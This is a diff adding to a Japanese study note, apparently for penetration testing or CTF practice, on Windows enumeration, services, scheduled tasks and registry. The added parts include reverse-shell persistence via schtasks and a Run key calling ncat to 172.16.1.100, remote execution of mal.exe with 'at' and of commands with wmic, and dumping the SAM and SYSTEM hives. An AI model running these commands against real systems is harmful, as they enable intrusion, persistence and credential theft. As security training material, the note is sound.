@@ -69,14 +69,20 @@ type - シンプルにファイルの中身を一気に表示するよ。「>>�
 
 ### ① 一般システム情報の収集
 > ```
-> systeminfo
+> ◇ systeminfo
 > - OS情報、ホスト名、IP アドレス、ドメインに属しているかどうか、インストールされている修正プログラムなど
 >
-> hostname
+> ◇ hostname
 > - ホスト名
-> ver
+>
+> ◇ ver
 > - OSバージョン情報
-> 
+>
+> ◇ time /t
+> - システムの時刻
+>
+> ◇ 「fsutil fsinfo drives」
+> - マウントされているドライブの確認
 > ```
 
 ### ② ネットワーク情報
@@ -86,11 +92,27 @@ type - シンプルにファイルの中身を一気に表示するよ。「>>�
 >
 > arp /a
 > - ARPテーブル(ターゲットがどのホストと接続したかを確認でき、アクセスできる可能性の高いIPがわかる)
->
+> 
 > type C:\windows\system32\drivers\etc\hosts
 > - hostsファイルの情報からレガシーシステム等のドメイン情報などが取得できる
+>
+> netstat -ano
+> - ポートの接続状況(どこと通信をしているかを把握できる)
+>
+> 「netsh winhttp show proxy」
+> - プロキシ設定の表示
 > ```
 
+#### -コラム- ポートの接続状況からわかること
+* 外部のサーバ等との連携や接続  
+クラウドにサーバがあったり、サーバを分散している場合、外部のネットワークのIPと通信している可能性がある
+  
+* セキュリティ構成を推定  
+動いているセキュリティソフトと合わせてみることで、どのような構成のセキュリティシステムが実際に施されているのか推定することができるんじゃね。
+具体的には、監視ソフトが利用されているとか、どこが監視用サーバとかが、わかるかもしれない。どのような形態でセキュリティソフトがりよされているかとか
+
+* RDPとかの通信があったら  
+セッションを乗っ取ることができるかもしれない
 ### ② ユーザ情報
 > ```
 > ◇ 自身のユーザ情報を取得
@@ -259,3 +281,142 @@ Flags aren't hard to find now, right?
 ◇ URLからファイルを落とすツールとして  
 -URLCache  
 
+## (5) 環境変数
+### ① 変数のスコープ
+グローバルスコープ：  
+グローバル変数はアクセス可能ですglobally。このコンテキストでは、グローバル スコープにより、プログラム内のどこからでも変数内に格納されたデータにアクセスして参照できることがわかります。  
+  
+ローカルスコープ：  
+ローカル変数はlocalコンテキスト内でのみアクセスできます。Localつまり、これらの変数内に格納されたデータは、それが宣言された関数またはコンテキスト内でのみアクセスおよび参照できます。  
+
+### ②　変数の作成
+◇ ローカル変数の作成　 - `set <hensu>=<value>`  
+  
+◇ グローバル変数の作成 - `setx <hensu> <value>`  
+
+### ③ 重要な環境変数
+<table class="table table-striped text-left">
+<thead>
+<tr>
+<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">変数名</font></font></th>
+<th><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">説明</font></font></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>%PATH%</code></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">実行可能プログラムが配置されているディレクトリ (場所) のセットを指定します。</font></font></td>
+</tr>
+<tr>
+<td><code>%OS%</code></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザーのワークステーション上の現在のオペレーティング システム。</font></font></td>
+</tr>
+<tr>
+<td><code>%SYSTEMROOT%</code></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">に展開されます</font></font><code>C:\Windows</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。Windows システム フォルダーを含む、システム定義の読み取り専用変数です。重要なデータ、コア システム バイナリ、構成ファイルなど、Windows がコア機能にとって重要と見なすものはすべてここにあります。</font></font></td>
+</tr>
+<tr>
+<td><code>%LOGONSERVER%</code></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">現在アクティブなユーザーのログイン サーバーと、それに続くマシンのホスト名を提供します。この情報を使用して、マシンがドメインまたはワークグループに参加しているかどうかを確認できます。</font></font></td>
+</tr>
+<tr>
+<td><code>%USERPROFILE%</code></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">現在アクティブなユーザーのホーム ディレクトリの場所を提供します。 に展開されます</font></font><code>C:\Users\{username}</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></td>
+</tr>
+<tr>
+<td><code>%ProgramFiles%</code></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と同等です</font></font><code>C:\Program Files</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。この場所は、ベース システム上のすべてのプログラムがインストールされる場所です</font></font><code>x64</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></td>
+</tr>
+<tr>
+<td><code>%ProgramFiles(x86)%</code></td>
+<td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と同等です</font></font><code>C:\Program Files (x86)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。この場所には、実行中のすべての 32 ビット プログラム</font></font><code>WOW64</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">がインストールされます。この変数は 64 ビット ホストでのみアクセス可能であることに注意してください。これは、対話しているホストの種類を示すために使用できます。(</font><font style="vertical-align: inherit;">アーキテクチャ</font></font><code>x86</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">とは対照的)</font></font><code>x64</code><font style="vertical-align: inherit;"></font></td>
+</tr>
+</tbody>
+</table>
+
+## (6) サービス管理
+永続化にも利用できるし、脆弱性のあるサービスが動いていたら、権限昇格にも利用できる
+
+### ① 稼働しているサービスの列挙
+◇ scコマンド - `sc query type= service`  
+  
+◇ tasklistコマンド - `tasklist /svc`  
+  
+◇ ネットスタート - `net start`  
+  
+◇ wmicの利用 - `wmic service list brief`  
+  
+※ここから気になったやつは、それぞれのコマンドで個々のサービスを検索できる
+### ② サービスを操作するとき
+サービスの依存関係を考えて操作する必要がある
+
+#### 例 Windows updateの停止(wuauserv)
+Windows updateを停止するためには、二つのサービスを消す必要がある
+* wuauserv (Windows アップデート サービス)
+* bits (バックグラウンド インテリジェント転送サービス)
+
+### ③ Windows Defender(windefend)
+SYSTEM権限がなければこれを停止することができない。現最新OSのWiondows11では、セーフティモードでないとディフェンダーを無効化できなくなっている。
+
+## (7) タスクスケジュール
+永続化にも利用できるし、脆弱性のあるスクリプトがタスクとして動いていたら、権限昇格にも利用できる。  
+  
+マルウェア ⇒ 行動がばれないように特定の時間や場所、イベント発生で動くように作られているものがある。  
+
+### ① タスクスケジュールするトリガー
+* 特定のシステム イベントが発生したとき。
+* 特定の時間に。
+* 毎日のスケジュールの特定の時間。
+* 毎週のスケジュールに従って特定の時間に。
+* 月ごとのスケジュールに従って特定の時間に。
+* 月ごとの曜日スケジュールの特定の時間。
+* コンピュータがアイドル状態になったとき。
+* タスクが登録されたとき。
+* システムが起動したとき。
+* ユーザーがログオンするとき。
+* ターミナル サーバー セッションの状態が変わったとき。
+
+などがある。
+### ② schtasks によるタスクスケージュール管理
+◇ すべてのタスクスケジュールの詳細をリストする  
+```
+SCHTASKS /Query /V /FO list
+```
+  
+◇ 新しいタスクをスケジュールする(例： リバースシェルによる永続化)
+```
+schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
+```
+
+◇ リモートマシンへ新しいタスクをスケジュールする.
+※細かいところはマニュアル見ろよ
+
+### ③ 他のコマンドによるリモートに対するタスクのスケージュールを実行
+◇ at (Windows 11では、廃止されている)  
+```
+at \\[リモートホスト名 or IPアドレス] 12:00 cmd /c "C:\windows\temp\mal.exe"
+```
+  
+◇ wmic  
+```
+wmic /node:[IPアドレス] /user:”[ユーザ名]” /password:”[パスワード]” process call create “cmd /c c:\Windows\System32\net.exe user”
+```
+## --コラム--
+(6)と(7)で扱ったものは、リモートで実行させることが可能。  
+リモートのマシンへの資格情報等があれば、リモートマシンに対して、任意のタスクをスケジュールしたり、任意のサービスを実行させることが、できる  
+⇒ 横展開(マルウェアなら感染を拡大するために利用できる)
+
+## (8) レジストリの操作
+### ① regによるレジストリ操作
+◇ SAM、SYSTEM等のレジストリハイブの出力
+```
+reg save hklm\system system
+reg save hklm\sam sam
+```
+
+◇ ユーザログオン時に実行するファイルを指定  
+```
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v hello_value /t REG_SZ /d "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100" 
+```
+
+# 2 PowerShell
